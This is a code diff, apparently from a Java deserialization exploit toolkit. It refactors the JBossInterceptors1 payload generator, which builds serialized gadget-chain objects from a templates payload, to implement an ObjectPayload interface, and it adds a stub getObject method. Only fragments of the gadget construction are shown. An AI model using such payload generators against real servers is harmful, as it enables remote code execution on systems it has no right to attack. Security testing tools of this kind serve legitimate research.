@@ -23,9 +23,9 @@ import java.io.ObjectOutputStream;
 import java.lang.reflect.Constructor;
 import java.util.*;
 
-public class JBossInterceptors1 {
+public class JBossInterceptors1 implements ObjectPayload<Object> {
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object tpl = Gadgets.createTemplatesImpl(type, param);
 
         InterceptionModelBuilder builder              = InterceptionModelBuilder.newBuilderFor(HashMap.class);
@@ -72,5 +72,10 @@ public class JBossInterceptors1 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
